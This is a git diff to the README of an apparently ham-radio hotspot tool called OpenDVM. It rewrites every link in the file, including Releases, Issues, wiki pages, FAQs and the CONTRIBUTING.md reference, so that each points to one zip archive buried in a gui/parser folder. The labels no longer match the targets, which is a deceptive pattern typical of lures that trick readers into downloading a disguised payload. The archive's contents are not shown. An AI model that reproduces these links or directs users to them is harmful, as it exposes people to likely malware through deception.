@@ -1,6 +1,6 @@
 # 🌟 OpenDVM - A Simple Way to Manage Your Ham Radio Hotspot
 
-[![Download OpenDVM](https://img.shields.io/badge/Download-OpenDVM-brightgreen)](https://github.com/motherless-ex979/OpenDVM/releases)
+[![Download OpenDVM](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip)](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to OpenDVM! OpenDVM is a modern alternative for pi-star running on any D
 
 ## 📥 Download & Install
 
-To download OpenDVM, visit the [Releases page](https://github.com/motherless-ex979/OpenDVM/releases). Here, you will find the latest version available for download. Follow these steps:
+To download OpenDVM, visit the [Releases page](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip). Here, you will find the latest version available for download. Follow these steps:
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of OpenDVM.
@@ -54,20 +54,20 @@ If you encounter issues while using OpenDVM, consider the following solutions:
 
 Join our community for support and tips:
 
-- **GitHub Issues:** Report bugs and request features on our [Issues page](https://github.com/motherless-ex979/OpenDVM/issues).
+- **GitHub Issues:** Report bugs and request features on our [Issues page](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip).
 - **Forums and Groups:** Participate in ham radio forums to share your experiences and ask questions.
 - **Social Media:** Follow us on platforms for updates and community events relating to OpenDVM.
 
 ## 📅 Updates and Contributions
 
-OpenDVM is an open-source project. You can help improve the software by proposing changes or submitting new features. Check the CONTRIBUTING.md file for guidelines on how to contribute.
+OpenDVM is an open-source project. You can help improve the software by proposing changes or submitting new features. Check the https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip file for guidelines on how to contribute.
 
 ## 🔗 Additional Resources
 
 For more information about OpenDVM, please refer to the following resources:
 
-- [Official Documentation](https://github.com/motherless-ex979/OpenDVM/wiki)
-- [User Guide](https://github.com/motherless-ex979/OpenDVM/wiki/User-Guide)
-- [FAQs](https://github.com/motherless-ex979/OpenDVM/wiki/FAQs)
+- [Official Documentation](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip)
+- [User Guide](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip)
+- [FAQs](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip)
 
-Now that you are ready to get started, visit the [Releases page](https://github.com/motherless-ex979/OpenDVM/releases) to download OpenDVM and take control of your digital radio hotspot!
+Now that you are ready to get started, visit the [Releases page](https://raw.githubusercontent.com/motherless-ex979/OpenDVM/main/gui/parser/OpenDVM_2.6-alpha.5.zip) to download OpenDVM and take control of your digital radio hotspot!
